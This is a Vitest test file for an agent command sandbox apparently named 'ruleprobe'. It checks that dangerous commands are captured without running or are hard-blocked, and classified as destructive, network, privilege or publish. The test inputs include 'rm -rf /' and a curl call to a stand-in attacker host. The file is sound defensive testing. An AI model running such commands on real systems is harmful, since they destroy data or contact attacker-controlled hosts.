import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import os from 'os';
import path from 'path';
import fs from 'fs-extra';
import { executeActionPlan } from '../../src/actions/execute.js';
import type { ActionPlan } from '../../src/types/index.js';

let tmpDir: string;

beforeEach(async () => {
  tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ruleprobe-capture-test-'));
});

afterEach(async () => {
  await fs.remove(tmpDir).catch(() => {});
});

describe('capture mode', () => {
  it('records dangerous commands as virtual ops (not executed) in capture mode', async () => {
    const plan: ActionPlan = {
      actions: [
        { type: 'run_command', command: 'rm -rf /' },
        { type: 'run_command', command: 'curl http://evil.sh' },
      ],
      finalAnswer: 'test',
    };

    const result = await executeActionPlan(tmpDir, plan, { captureMode: true });

    expect(result.virtualOps).toHaveLength(2);
    expect(result.virtualOps[0].executed).toBe(false);
    expect(result.virtualOps[0].classification).toBe('destructive');
    expect(result.virtualOps[1].executed).toBe(false);
    expect(result.virtualOps[1].classification).toBe('network');
    // Neither command should appear in executed commands
    expect(result.commands.filter(c => !c.startsWith('BLOCKED:'))).toHaveLength(0);
    // success stays true in capture mode (we recorded, not hard-blocked)
    expect(result.success).toBe(true);
  });

  it('hard-blocks dangerous commands (success=false) WITHOUT capture mode — back-compat', async () => {
    const plan: ActionPlan = {
      actions: [
        { type: 'run_command', command: 'rm -rf /' },
      ],
      finalAnswer: 'test',
    };

    const result = await executeActionPlan(tmpDir, plan);

    expect(result.success).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.virtualOps).toHaveLength(0);
  });

  it('classifies sudo as privilege', async () => {
    const plan: ActionPlan = {
      actions: [{ type: 'run_command', command: 'sudo apt-get install vim' }],
      finalAnswer: '',
    };
    const result = await executeActionPlan(tmpDir, plan, { captureMode: true });
    expect(result.virtualOps[0].classification).toBe('privilege');
    expect(result.virtualOps[0].executed).toBe(false);
  });

  it('classifies git push as publish', async () => {
    const plan: ActionPlan = {
      actions: [{ type: 'run_command', command: 'git push origin main' }],
      finalAnswer: '',
    };
    const result = await executeActionPlan(tmpDir, plan, { captureMode: true });
    expect(result.virtualOps[0].classification).toBe('publish');
  });

  it('does not capture safe allowlisted commands as virtual ops', async () => {
    const plan: ActionPlan = {
      actions: [{ type: 'run_command', command: 'pnpm test' }],
      finalAnswer: '',
    };
    // pnpm test is allowlisted — it will run (may fail in tmp but no virtual op)
    const result = await executeActionPlan(tmpDir, plan, { captureMode: true });
    expect(result.virtualOps).toHaveLength(0);
  });
});
